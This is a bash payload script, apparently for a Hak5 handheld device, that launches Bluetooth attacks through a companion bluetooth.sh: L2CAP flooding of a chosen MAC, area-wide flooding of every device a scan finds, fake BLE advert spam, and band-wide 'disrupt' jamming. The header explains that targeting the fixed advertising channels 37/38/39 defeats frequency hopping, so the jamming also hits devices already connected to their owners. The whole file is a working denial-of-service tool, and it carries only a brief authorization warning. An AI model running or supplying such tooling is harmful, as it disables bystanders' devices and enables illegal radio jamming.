#!/bin/bash
# Title: Bluetooth Jam
# Author: florian
# Description: Scan, L2CAP-flood one target, jam the whole area, flood BLE adverts, or occupy the 2.4GHz band (full sweep or BLE-advertising-channel focus) - works on already-connected devices too. Press B to stop.
# Version: 4.1
#
# NEW in 4.1: a second Disrupt mode using --focus (see bluetooth.sh's own
# comments on run_disrupt) - occupies only the 3 FIXED BLE advertising
# channels (37/38/39, never hopped) instead of sweeping all 40. Real
# Bluetooth links use Adaptive Frequency Hopping, which actively routes a
# connection's hop map AWAY from a channel it detects as noisy - meaning
# the full 40-channel sweep is fighting a moving, self-defending target.
# The 3 advertising channels can't move: any BLE scan/advertise/reconnect
# activity has to use exactly them, so this guarantees overlap instead of
# depending on luck. Still BLE-only - see the honest classic-BT caveat
# both modes now print.
#
# REAL LIMITATION (found via live testing): flood/jam only work against a
# device that's actually accepting new connections right now. A device
# already connected+streaming to its real owner (most earbuds/headphones
# in normal use) usually refuses new connections outright, so there's
# nothing to flood - this shows up as "NOT REACHABLE" in the log, not a
# silent failure. "Disrupt area" below doesn't have this limitation - it
# never tries to connect to anything, it occupies the shared spectrum
# directly, so it works the same whether a device is idle or already
# connected+streaming.
#
# Uses the Pager's internal Bluetooth radio via the standard BlueZ tools
# (Hak5 has no dedicated DuckyScript Bluetooth command family for the
# Pager - this drives the real bluetoothd/hcitool/l2ping/btmgmt stack
# directly, same as bluetooth.sh over SSH).
#
# "Jam the area" and "Adv-spam" don't need you to pick a device first -
# they scan/flood whatever's nearby on their own. "Flood a target" is for
# when you already know the specific MAC you want.
#
# IMPORTANT: only run against your own devices or ones you are explicitly
# authorized to test.

if [ ! -x /root/scripts/bluetooth.sh ]; then
    ERROR_DIALOG "bluetooth.sh not found - run the toolkit setup.py first."
    exit 1
fi

# REGRESSION FOUND AND FIXED (found via code review): a prior "duplicate
# entry" cleanup here mistook LIST_PICKER's REQUIRED trailing default-
# selection argument for an accidental repeated menu item and deleted it.
# Confirmed against Hak5's own docs: `LIST_PICKER [title] [option] [default]`
# - the last argument is a required "which option is preselected" parameter,
# separate from the option list ("A default option must always be
# provided!"). Restored it here (defaulting to "Scan", the original
# pre-regression default - the safest, read-only first option).
__action=$(LIST_PICKER "Bluetooth" "Scan" "Flood a target" "Jam the whole area" "Adv-spam area" "Disrupt area (full sweep)" "Disrupt area (BLE reconnect focus)" "Scan") || exit 0

case "$__action" in
    "Scan")
        LOG "Scanning for nearby Bluetooth devices (15s)..."
        __result=$(/root/scripts/bluetooth.sh --scan --duration 15 -y 2>&1)
        LOG "$__result"
        ALERT "Scan complete - see log"
        ;;

    "Flood a target")
        __mac=$(MAC_PICKER "Target MAC (from a scan)" "") || exit 0
        if ! CONFIRMATION_DIALOG "L2CAP-flood $__mac? Won't do anything if it's already connected elsewhere and refuses new connections."; then
            LOG "User cancelled."
            exit 0
        fi
        LOG "Flooding $__mac - press B to stop."
        # BUG FOUND AND FIXED (found via code review - same class already
        # fixed for "Adv-spam area" below and in wifi_deauth/payload.sh):
        # this used to show "running - press B to stop" unconditionally
        # right after launching --background, with no check the launch
        # actually survived. bluetooth.sh's own --background path already
        # verifies liveness internally and exits non-zero if it didn't
        # start (bad MAC format aside, already checked above) - just
        # propagate that instead of assuming success.
        if ! /root/scripts/bluetooth.sh --flood "$__mac" -y --background; then
            ERROR_DIALOG "Flood did not start - see log and try again."
            exit 1
        fi
        ALERT "Bluetooth flood running - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        /root/scripts/bluetooth.sh --stop
        if grep -q "NOT REACHABLE" /tmp/pager-bluetooth.log 2>/dev/null; then
            LOG "$__mac never accepted a connection - it's likely busy with an active connection to its real owner."
            ALERT "Target refused connection - see log"
        else
            LOG "Flood stopped."
            ALERT "Bluetooth flood stopped"
        fi
        ;;

    "Jam the whole area")
        if ! CONFIRMATION_DIALOG "Scan then flood EVERY nearby Bluetooth device? Authorized area only!"; then
            LOG "User cancelled."
            exit 0
        fi
        LOG "Scanning (classic + BLE), then jamming every device found - press B to stop."
        # BUG FOUND AND FIXED (same class as "Flood a target" above).
        if ! /root/scripts/bluetooth.sh --jam-area -y --background; then
            ERROR_DIALOG "Area jam did not start - see log and try again."
            exit 1
        fi
        ALERT "Area jam running - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        /root/scripts/bluetooth.sh --stop
        # BUG FOUND AND FIXED (found via code review, confirmed by direct
        # testing - same bug found and fixed in report.sh): `grep -c`
        # exits 1 (not 0) when the count is genuinely zero, even though it
        # still correctly prints "0" - so the `|| echo 0` fallback ALSO
        # ran in exactly that case, leaving this as the two-line string
        # "0\n0" instead of "0" whenever every device was actually
        # reachable. Only fall back to 0 when grep produced no output at
        # all (a real error), not based on its exit status.
        __unreachable=$(grep -c "NOT REACHABLE" /tmp/pager-bluetooth.log 2>/dev/null)
        __unreachable="${__unreachable:-0}"
        LOG "Area jam stopped. $__unreachable device(s) refused connections outright (already busy elsewhere) - see /tmp/pager-bluetooth.log for details."
        ALERT "Area jam stopped"
        ;;

    "Adv-spam area")
        if ! CONFIRMATION_DIALOG "Flood the area with fake BLE adverts?"; then
            LOG "User cancelled."
            exit 0
        fi
        LOG "Registering BLE advertising instances - press B to stop."
        __result=$(/root/scripts/bluetooth.sh --advspam -y 2>&1)
        __rc=$?
        LOG "$__result"
        # BUG FOUND AND FIXED (found via code review): bluetooth.sh
        # --advspam can genuinely fail (btmgmt rejects every add-adv call
        # - see its own "added -eq 0" check) - this used to claim "BLE
        # adv-spam running - press B to stop" and wait for a button press
        # regardless, then "stopped" afterward, all for something that
        # never actually started. Check the real exit code first.
        if [ "$__rc" -ne 0 ]; then
            ERROR_DIALOG "Adv-spam failed to start - see log"
            exit 1
        fi
        ALERT "BLE adv-spam running - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        /root/scripts/bluetooth.sh --stop
        LOG "Adv-spam stopped."
        ALERT "BLE adv-spam stopped"
        ;;

    "Disrupt area (full sweep)")
        if ! CONFIRMATION_DIALOG "Occupy the whole 2.4GHz Bluetooth band directly? No target needed, works on connected devices too."; then
            LOG "User cancelled."
            exit 0
        fi
        LOG "Occupying all 40 BLE channels in rotation - press B to stop."
        # BUG FOUND AND FIXED (same class as "Flood a target" above).
        if ! /root/scripts/bluetooth.sh --disrupt --background -y; then
            ERROR_DIALOG "Disrupt did not start - see log and try again."
            exit 1
        fi
        ALERT "Disrupt running - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        /root/scripts/bluetooth.sh --stop
        LOG "Disrupt stopped."
        ALERT "Disrupt stopped"
        ;;

    "Disrupt area (BLE reconnect focus)")
        if ! CONFIRMATION_DIALOG "Occupy only the 3 fixed BLE advertising channels? Guaranteed overlap with any BLE scan/reconnect activity, but still BLE-only (see log note)."; then
            LOG "User cancelled."
            exit 0
        fi
        LOG "Occupying BLE advertising channels 37/38/39 only - press B to stop."
        # BUG FOUND AND FIXED (same class as "Flood a target" above).
        if ! /root/scripts/bluetooth.sh --disrupt --focus --background -y; then
            ERROR_DIALOG "Disrupt (focus) did not start - see log and try again."
            exit 1
        fi
        ALERT "Disrupt (focus) running - press B to stop"
        WAIT_FOR_BUTTON_PRESS B
        /root/scripts/bluetooth.sh --stop
        LOG "Disrupt (focus) stopped."
        ALERT "Disrupt (focus) stopped"
        ;;
esac
